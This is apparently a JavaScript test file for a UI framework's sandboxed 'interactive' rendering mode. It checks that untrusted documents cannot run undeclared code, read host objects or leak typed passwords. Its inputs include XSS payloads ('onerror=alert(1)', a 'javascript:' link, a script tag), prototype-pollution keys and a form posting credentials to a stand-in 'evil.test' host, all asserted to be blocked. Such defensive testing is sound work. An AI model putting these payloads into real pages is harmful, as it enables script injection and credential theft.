//@ts-check
/**
 * @file `createApp(doc, { safe: 'interactive' })`: an untrusted app document
 * rendered without a frame keeps its data-only bindings and its granted
 * widgets, and reaches nothing of the host beyond them. The view's own
 * decisions are pinned in test/view/interactive.test.js; these are the app's:
 * a binding names an action the document declared or nothing runs, `$event`
 * is the view's data projection, host capabilities are granted by name only,
 * and a granted dialog renders the document's content under the same profile.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { createApp } from '@jarenjs/app';
import { createDialogWidget } from '@jarenjs/app/dialog';
import { createStubHost, fire } from '../view/dom.stub.js';
import { childMarkup } from '../view/interactive-corpus.js';

/**
 * Boot an app under the interactive profile on a fresh stub host.
 * @param {any} doc
 * @param {Record<string, any>} [options]
 */
function boot(doc, options = {}) {
  const host = createStubHost();
  /** @type {string[]} */
  const seen = [];
  /** @type {any[]} */
  const errors = [];
  const app = createApp(doc, {
    document: host.document, node: host.container, safe: 'interactive', schedule: (flush) => flush(),
    onUnsafe: (info) => seen.push(`${info.kind}:${info.name}`), onError: (error) => errors.push(error),
    ...options,
  });
  return { app, host, seen, errors, root: () => host.container.childNodes[0] };
}

const COUNTER = {
  state: { n: 0, last: null },
  actions: {
    inc: { patch: [{ op: 'replace', path: '/n', value: { $add: ['$.n', 1] } }] },
    remember: { patch: [{ op: 'replace', path: '/last', value: '$event' }] },
  },
};

describe('interactive app — a binding runs a declared action, and nothing else', () => {
  it('dispatches a declared action from a click and re-renders', () => {
    const { app, root, seen, errors } = boot({ ...COUNTER, view: [{ match: '$', body: ['button', { on: { click: 'inc' } }, '$.n'] }] });
    fire(root(), 'click');
    fire(root(), 'click');
    assert.equal(app.getState().n, 2);
    assert.equal(childMarkup(root().parentNode), '<button>2</button>');
    assert.deepEqual(seen, []);
    assert.deepEqual(errors, []);
    app.destroy();
  });

  it('dispatches nothing for a name the document did not declare: code, prototype members, host paths', () => {
    const names = ['alert(1)', 'globalThis.attacked = true', '__proto__', 'constructor', 'toString', 'hasOwnProperty',
      'valueOf', 'window.location', 'effects.network', ''];
    const network = [];
    const view = ['div', {}, ...names.map((name) => ['button', { on: { click: { action: name, preventDefault: true, stopPropagation: true } } }, 'x']),
      ...names.map((name) => ['button', { on: { click: name } }, 'y'])];
    const { app, root, errors } = boot({ ...COUNTER, view: [{ match: '$', body: view }] }, {
      effects: { network: () => network.push('ran') },
    });
    let prevented = 0, stopped = 0;
    for (const button of root().childNodes) {
      fire(button, 'click', { preventDefault() { prevented++; }, stopPropagation() { stopped++; } });
    }
    assert.deepEqual(app.getState(), COUNTER.state);
    assert.deepEqual([prevented, stopped], [0, 0], 'an undeclared action owns no native control');
    assert.equal(errors.length, names.length * 2);
    assert.ok(errors.every((error) => error.code === 'JA2001'), errors.map((e) => e.code).join());
    assert.deepEqual(network, []);
    assert.equal(/** @type {any} */ (globalThis).attacked, undefined);
    app.destroy();
  });

  it('a declared action applies its native controls through the projection', () => {
    const { app, root } = boot({ ...COUNTER, view: [{ match: '$', body: ['form', { on: { submit: { action: 'inc', preventDefault: true } } }, ['button', {}, 'go']] }] });
    let prevented = 0;
    fire(root(), 'submit', { preventDefault() { prevented++; } });
    assert.ok(prevented >= 1, 'the submission\'s default never runs');
    assert.equal(app.getState().n, 1);
    app.destroy();
  });

  it('binds $event to JSON: requested host members read null and are reported', () => {
    const fields = ['target', 'currentTarget', 'view', 'srcElement', 'composedPath', '__proto__', 'constructor', 'screenX', 'shiftKey'];
    const { app, root, errors } = boot({ ...COUNTER, view: [{ match: '$', body: ['input', { on: { keydown: { action: 'remember', event: fields } } }] }] });
    const input = root();
    input.value = 'typed';
    fire(input, 'keydown', { key: 'a', shiftKey: true, screenX: 7, view: globalThis, srcElement: input, composedPath: () => [input] });
    const last = app.getState().last;
    assert.deepEqual(JSON.parse(JSON.stringify(last)), last, '$event survives JSON');
    assert.equal(last.value, 'typed');
    assert.equal(last.key, 'a');
    assert.equal(last.shiftKey, true);
    for (const name of ['target', 'currentTarget', 'view', 'srcElement', 'composedPath', 'screenX']) assert.equal(last[name], null, name);
    assert.equal(Object.getPrototypeOf(last), Object.prototype, 'no prototype was replaced');
    assert.ok(errors.some((error) => error.code === 'JA2009'));
    app.destroy();
  });

  it('hands a granted extractor the projection, never the native event or a node', () => {
    /** @type {any[]} */
    const received = [];
    const { app, root } = boot({ ...COUNTER, view: [{ match: '$', body: ['input', { on: { change: { action: 'remember', event: ['probe'] } } }] }] }, {
      eventFields: { probe: (event) => { received.push(event); return typeof event.target?.appendChild; } },
      capabilities: { eventFields: ['probe'] },
    });
    const native = fire(root(), 'change');
    assert.equal(received.length, 1);
    assert.notEqual(received[0], native);
    assert.ok(Object.isFrozen(received[0]));
    assert.equal(app.getState().last.probe, 'undefined', 'the target is a data slice, not the node');
    app.destroy();
  });

  it('withholds what was typed into a password field', () => {
    const { app, root } = boot({ ...COUNTER, view: [{ match: '$', body: ['input', { type: 'password', on: { input: { action: 'remember', event: ['selectionEnd'] }, keydown: { action: 'remember', event: ['code'] } } }] }] });
    const field = root();
    field.value = 'hunter2';
    fire(field, 'input', { target: field });
    assert.deepEqual(app.getState().last, { type: 'input', value: null, checked: null, key: null, selectionEnd: null });
    fire(field, 'keydown', { key: 'h', code: 'KeyH' });
    assert.deepEqual(app.getState().last, { type: 'keydown', value: null, checked: null, key: null, code: null });
    app.destroy();
  });

  it('an autofilled password and a submit send it nowhere: a dialog form, the default prevented, the value never in state', () => {
    const { app, root, seen } = boot({
      state: { last: null },
      actions: { login: { patch: [{ op: 'replace', path: '/last', value: '$event' }] }, remember: { patch: [{ op: 'replace', path: '/last', value: '$event' }] } },
      view: [{ match: '$', body: ['form', { action: 'https://evil.test/collect', method: 'post', target: '_top', on: { submit: { action: 'login', event: ['selectionStart', 'selectionEnd'] } } },
        ['input', { type: 'password', name: 'pw', autocomplete: 'current-password', on: { input: 'remember', change: 'remember' } }],
        ['button', { formaction: 'https://evil.test/', formmethod: 'post' }, 'Go']] }],
    });
    const form = root();
    const field = form.childNodes[0];
    // what a browser's autofill does: the value appears, input and change fire
    field.value = 'hunter2';
    const states = [];
    fire(field, 'input', { target: field });
    states.push(JSON.stringify(app.getState()));
    fire(field, 'change', { target: field });
    states.push(JSON.stringify(app.getState()));
    let prevented = 0;
    fire(form, 'submit', { target: form, preventDefault() { prevented++; } });
    states.push(JSON.stringify(app.getState()));
    assert.ok(prevented >= 1, 'the submission\'s own default never runs');
    assert.equal(app.getState().last.type, 'submit');
    for (const state of states) assert.doesNotMatch(state, /hunter2/);
    assert.deepEqual([...form.attributes.keys()], ['method']);
    assert.equal(form.getAttribute('method'), 'dialog');
    assert.deepEqual([...form.childNodes[1].attributes.keys()], []);
    assert.ok(['prop:action', 'prop:method', 'prop:target', 'prop:formaction', 'prop:formmethod'].every((report) => seen.includes(report)));
    app.destroy();
  });

  it('drops a binding the profile does not keep, and reports it', () => {
    const { app, root, seen } = boot({ ...COUNTER, view: [{ match: '$', body: ['img', { src: '/a.png', on: { load: 'inc', error: 'inc', click: 'inc' } }] }] });
    // the first frame reports each dropped binding once (a frame whose `on`
    // changes reports it again, as safe: true reports a stripped `on`)
    assert.deepEqual([...seen].sort(), ['event:error', 'event:load']);
    fire(root(), 'load');
    fire(root(), 'error');
    assert.equal(app.getState().n, 0);
    fire(root(), 'click');
    assert.equal(app.getState().n, 1);
    app.destroy();
  });
});

describe('interactive app — host capabilities are granted by name', () => {
  it('grants no effect, subscription, extractor or widget by default', () => {
    const called = [];
    const { app, root, seen } = boot({
      state: {}, actions: { run: { effects: [{ run: 'network' }] } }, subs: [{ run: 'poll', when: true }],
      view: [{ match: '$', body: ['div', {}, ['button', { on: { click: 'run' } }, 'x'], ['jaren-widget', { name: 'chart' }]] }],
    }, {
      effects: { network: () => called.push('effect') }, subs: { poll: () => called.push('sub') },
      widgets: { chart: { mount: () => called.push('widget') } },
    });
    fire(root().childNodes[0], 'click');
    assert.deepEqual(called, []);
    assert.ok(seen.includes('widget:chart'));
    app.destroy();
  });

  it('renders exactly the granted widgets, and runs exactly the granted effects', () => {
    const called = [];
    const { app, root, seen } = boot({
      state: {}, actions: { run: { effects: [{ run: 'network' }, { run: 'other' }] } },
      view: [{ match: '$', body: ['div', {}, ['button', { on: { click: 'run' } }, 'x'],
        ['jaren-widget', { name: 'chart', props: { points: [1, 2] } }], ['jaren-widget', { name: 'map' }]] }],
    }, {
      effects: { network: () => called.push('network'), other: () => called.push('other') },
      widgets: { chart: { mount: (_node, props) => called.push(`chart:${JSON.stringify(props)}`) }, map: { mount: () => called.push('map') } },
      capabilities: { effects: ['network'], widgets: ['chart'] },
    });
    fire(root().childNodes[0], 'click');
    assert.deepEqual(called, ['chart:{"points":[1,2]}', 'network']);
    assert.deepEqual(seen, ['widget:map']);
    app.destroy();
  });

  it("takes 'interactive' and refuses every other string for safe", () => {
    for (const safe of ['Interactive', 'false', 'true', 'yes', 'interactive ']) {
      assert.throws(() => createApp({ view: [] }, { safe }), (error) => error instanceof TypeError
        && /options\.safe must be a boolean or 'interactive'/.test(error.message), String(safe));
    }
    const { app } = boot({ state: {}, view: [{ match: '$', body: ['p', {}, 'ok'] }] });
    app.destroy();
  });
});

/** A stub DOM with the native dialog surface the dialog owner needs. */
function dialogHost() {
  const { document: doc, container: host } = createStubHost();
  const create = doc.createElement.bind(doc);
  const walk = (node) => [node, ...(node.childNodes ?? []).flatMap(walk)];
  doc.defaultView = { getComputedStyle: () => ({ visibility: 'visible' }) };
  const decorate = (node) => {
    node.contains = (other) => walk(node).includes(other);
    node.getClientRects = () => [{}];
    node.matches = () => false;
    node.closest = () => null;
    node.querySelectorAll = () => [];
    node.focus = () => { doc.activeElement = node; };
    Object.defineProperty(node, 'isConnected', { get: () => !!doc.body?.contains(node) });
    if (node.nodeName === 'DIALOG') {
      node.open = false;
      node.showModal = () => { node.open = true; };
      node.close = () => { node.open = false; };
    }
    return node;
  };
  doc.createElement = (tag) => decorate(create(tag));
  doc.body = doc.createElement('body');
  decorate(host);
  doc.body.appendChild(host);
  doc.getElementById = (id) => walk(doc.body).find((node) => node.getAttribute?.('id') === id) ?? null;
  return { doc, host, walk };
}

describe('interactive app — a granted dialog renders the document\'s content under the same profile', () => {
  it('sanitizes the content, keeps its data bindings, and grants it no widget the app did not', () => {
    const { doc, host, walk } = dialogHost();
    /** @type {string[]} */
    const seen = [];
    const mounted = [];
    const content = [
      ['div', { innerHTML: '<img src=x onerror=alert(1)>', id: 'payload' }, 'text'],
      ['script', {}, 'alert(1)'],
      ['a', { href: 'javascript:alert(1)' }, 'link'],
      ['button', { id: 'pick', on: { click: { action: 'pick', with: 3 }, load: 'pick' } }, 'Pick'],
      ['jaren-widget', { name: 'chart' }],
    ];
    const app = createApp({
      state: { picked: null, open: true },
      actions: { pick: { patch: [{ op: 'replace', path: '/picked', value: '$payload' }] }, close: { patch: [{ op: 'replace', path: '/open', value: false }] } },
      view: [{ match: '$', body: ['jaren-widget', { name: 'dialog', props: { id: 'd', title: 'Hostile', open: '$.open', content, close: 'close' } }] }],
    }, {
      document: doc, node: host, safe: 'interactive', schedule: (flush) => flush(),
      onUnsafe: (info) => seen.push(`${info.kind}:${info.name}`),
      widgets: { dialog: createDialogWidget(), chart: { mount: () => mounted.push('chart') } },
      capabilities: { widgets: ['dialog'] },
    });
    const nodes = walk(host);
    const payload = nodes.find((node) => node.getAttribute?.('id') === 'jaren-u-payload');
    assert.ok(payload, 'the content rendered');
    assert.equal(payload.attributes.has('innerHTML'), false);
    assert.equal(nodes.some((node) => node.tagName === 'script'), false);
    assert.equal(nodes.find((node) => node.tagName === 'a').attributes.has('href'), false);
    assert.deepEqual(mounted, [], 'the content may not mount a widget the app did not grant');
    assert.deepEqual(seen.sort(), ['event:load', 'prop:href', 'prop:innerHTML', 'tag:script', 'widget:chart']);
    fire(nodes.find((node) => node.getAttribute?.('id') === 'jaren-u-pick'), 'click');
    assert.equal(app.getState().picked, 3);
    // the dialog's own id joins the document's namespace too
    const dialog = nodes.find((node) => node.tagName === 'dialog');
    assert.equal(dialog.getAttribute('id'), 'jaren-u-d');
    assert.equal(dialog.getAttribute('aria-labelledby'), 'jaren-u-d-title');
    app.destroy();
  });

  it('the dialog owner renders plain content trusted when no profile is given, as before', async () => {
    const { createDialog } = await import('@jarenjs/view/helpers/dialog');
    const { doc, host, walk } = dialogHost();
    const owner = createDialog(host, { id: 'd', title: 'T', open: true, content: ['div', { id: 'own', title: 'host-authored' }] });
    assert.equal(walk(host).find((node) => node.getAttribute?.('id') === 'own').getAttribute('title'), 'host-authored');
    owner.dispose();
    assert.equal(doc.body.contains(host), true);
  });
});

describe('two untrusted apps on one page — each root and its dialog keep their own ids', () => {
  const documentWith = (title) => ({
    state: { open: true },
    actions: { close: { patch: [{ op: 'replace', path: '/open', value: false }] } },
    view: [{ match: '$', body: ['div', {}, ['label', { for: 'q' }, title], ['input', { id: 'q' }],
      ['jaren-widget', { name: 'dialog', props: { id: 'd', title, open: '$.open', content: [['p', { id: 'body' }, title]], close: 'close' } }]] }],
  });

  it('gives the second app the next namespace, its dialog included', () => {
    const { doc, host, walk } = dialogHost();
    const other = doc.createElement('div');
    doc.body.appendChild(other);
    const options = { document: doc, safe: /** @type {const} */ ('interactive'), schedule: (flush) => flush(),
      widgets: { dialog: createDialogWidget() }, capabilities: { widgets: ['dialog'] } };
    const first = createApp(documentWith('A'), { ...options, node: host });
    const second = createApp(documentWith('B'), { ...options, node: other });
    const ids = (root) => walk(root).map((node) => node.getAttribute?.('id') ?? node.getAttribute?.('for')).filter(Boolean);
    assert.deepEqual(ids(host), ['jaren-u-q', 'jaren-u-q', 'jaren-u-d', 'jaren-u-d-title', 'jaren-u-body']);
    assert.deepEqual(ids(other), ['jaren-u2-q', 'jaren-u2-q', 'jaren-u2-d', 'jaren-u2-d-title', 'jaren-u2-body']);
    second.destroy();
    first.destroy();
  });

  it('a host dialog rendering untrusted content beside a safe root joins the content\'s namespace', async () => {
    const { createDialog } = await import('@jarenjs/view/helpers/dialog');
    const { createDomRenderer } = await import('@jarenjs/view');
    const { doc, host, walk } = dialogHost();
    const page = doc.createElement('div');
    doc.body.appendChild(page);
    const render = createDomRenderer(page, { document: doc, safe: true });
    render(['p', { id: 'd' }, 'page']);
    const owner = createDialog(host, { id: 'd', title: 'T', open: true, content: ['p', { id: 'own' }, 'x'] }, { safe: true });
    const dialog = walk(host).find((node) => node.tagName === 'dialog');
    assert.equal(dialog.getAttribute('id'), 'jaren-u2-d');
    assert.equal(dialog.getAttribute('aria-labelledby'), 'jaren-u2-d-title');
    assert.ok(walk(host).find((node) => node.getAttribute?.('id') === 'jaren-u2-own'));
    owner.dispose();
    render.destroy();
  });
});
